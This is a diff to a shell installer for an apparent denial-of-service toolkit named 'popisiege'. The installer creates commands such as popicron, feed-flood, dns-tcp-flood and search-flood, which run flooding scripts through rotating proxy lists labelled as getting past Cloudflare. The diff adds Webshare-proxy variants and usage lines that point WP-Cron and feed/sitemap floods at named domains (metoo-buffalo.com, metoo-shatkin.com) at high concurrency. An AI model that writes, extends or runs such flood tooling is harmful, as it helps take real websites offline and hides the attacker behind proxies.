@@ -78,11 +78,17 @@ _make_cmd /usr/local/bin/dns-tcp-flood \
 _make_cmd /usr/local/bin/popicron \
     "exec python3 /opt/popisiege/cron_hit.py --proxy-file /opt/popisiege/proxies_cf_passing_new.txt \"\$@\""
 
+_make_cmd /usr/local/bin/popicron-ws \
+    "exec python3 /opt/popisiege/cron_hit.py --webshare \"\$@\""
+
 _make_cmd /usr/local/bin/refresh-proxies \
     "exec bash /opt/popisiege/refresh_proxies.sh"
 
 _make_cmd /usr/local/bin/feed-flood \
     "exec python3 /opt/popisiege/feed_flood.py --proxy-file /opt/popisiege/proxies_cf_passing_new.txt \"\$@\""
+
+_make_cmd /usr/local/bin/feed-flood-ws \
+    "exec python3 /opt/popisiege/feed_flood.py --webshare \"\$@\""
 
 # ── done ───────────────────────────────────────────────────────────────────────
 echo ""
@@ -98,13 +104,17 @@ echo ""
 echo -e "  ${B}WP-Cron Flood (US proxies):${W}"
 echo    "    refresh-proxies"
 echo    "    popicron --target metoo-buffalo.com --concurrency 25"
-echo    "    popicron --concurrency 30 --bursts 0
-
-  Feed/Sitemap/Home Flood (shatkin open endpoints):
-    refresh-proxies
-    feed-flood --target metoo-shatkin.com --concurrency 25
-    feed-flood --target metoo-shatkin.com --concurrency 25 --endpoints feed sitemap
-    feed-flood --concurrency 30 --bursts 0"
+echo    "    popicron --concurrency 30 --bursts 0"
+echo    "    popicron-ws --target metoo-buffalo.com --concurrency 25"
+echo    "    popicron-ws --concurrency 30 --bursts 0"
+echo ""
+echo -e "  ${B}Feed/Sitemap/Home Flood (shatkin open endpoints):${W}"
+echo    "    refresh-proxies"
+echo    "    feed-flood --target metoo-shatkin.com --concurrency 25"
+echo    "    feed-flood --target metoo-shatkin.com --concurrency 25 --endpoints feed sitemap"
+echo    "    feed-flood --concurrency 30 --bursts 0"
+echo    "    feed-flood-ws --target metoo-shatkin.com --concurrency 25"
+echo    "    feed-flood-ws --concurrency 30 --bursts 0"
 echo ""
 echo -e "  ${B}Search Flood (PHP + MySQL):${W}"
 echo    "    search-flood --verbose"
